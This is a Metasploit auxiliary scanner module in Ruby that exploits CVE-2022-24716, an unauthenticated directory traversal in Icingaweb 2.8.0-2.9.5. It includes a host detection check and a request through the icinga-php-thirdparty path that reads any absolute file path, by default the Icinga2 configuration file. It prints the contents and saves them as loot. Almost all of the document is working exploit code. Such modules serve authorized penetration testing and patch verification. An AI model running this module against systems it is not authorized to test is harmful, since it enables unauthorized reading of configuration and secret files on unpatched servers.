##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Icingaweb Directory Traversal in Static Library File Requests',
        'Description' => %q{
          Icingaweb versions between 2.9.0-2.9.5, 2.8.0-2.8.5 (inclusive) suffer from an
          unauthenticated directory traversal vulnerability. The vulnerability is triggered
          through the icinga-php-thirdparty library, and the file to read is an absolute path.

          This module was tested against Icingaweb 2.9.5 running on Docker.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Jacob Ebben', # EDB
          'Thomas Chauchefoin' # initial POC and discovery
        ],
        'References' => [
          ['EDB', '51329'],
          ['URL', 'https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/'],
          ['URL', 'https://github.com/Icinga/icingaweb2/security/advisories/GHSA-5p3f-rh28-8frw'],
          ['URL', 'https://github.com/Icinga/icingaweb2/commit/9931ed799650f5b8d5e1dc58ea3415a4cdc5773d'],
          ['CVE', '2022-24716'],
        ],
        'Targets' => [
          ['Icingaweb', {}],
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DisclosureDate' => '2022-05-09',
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'The URI of the Icinga Application', '/']),
        OptString.new('File', [true, 'File to retrieve', '/etc/icinga2/icinga2.conf']) # https://icinga.com/docs/icinga-2/latest/doc/04-configuration/#configuration-overview
      ]
    )
  end

  def check_host(_ip)
    res = send_request_cgi!(
      'uri' => normalize_uri(target_uri.path)
    )
    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
    return Exploit::CheckCode::Unknown("#{peer} - Page didn't load correctly (response code: #{res.code}), check TARGETURI/port?") unless res.code == 200
    return Exploit::CheckCode::Unknown("#{peer} - Page doesn't have a body, check TARGETURI/port?") if res.body.nil?
    return Exploit::CheckCode::Detected("#{peer} - Icinga Web 2 found, unable to determine version.") if res.body.include?('<meta name="application-name" content="Icinga Web 2">')

    return Exploit::CheckCode::Safe("#{peer} - Web server found, but couldn't detect Icinga")
  end

  def run_host(ip)
    vprint_status('Attempting to retrieve file')
    res = send_request_cgi!(
      'uri' => normalize_uri(target_uri.path, 'lib', 'icinga', 'icinga-php-thirdparty', datastore['FILE'])
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Page didn't load correctly. Most likely file doesn't exist (response code: #{res.code})") unless res.code == 200
    fail_with(Failure::UnexpectedReply, "#{peer} - Page didn't load correctly, no body found") if res.body.nil?
    if !res.body.empty?
      print_good(res.body)
      loot_path = store_loot('icinga file', 'text/plain', ip, res.body, datastore['FILE'])
      print_good("#{datastore['FILE']} saved to #{loot_path}")
    else
      vprint_error('Response has 0 size.')
    end
  end
end
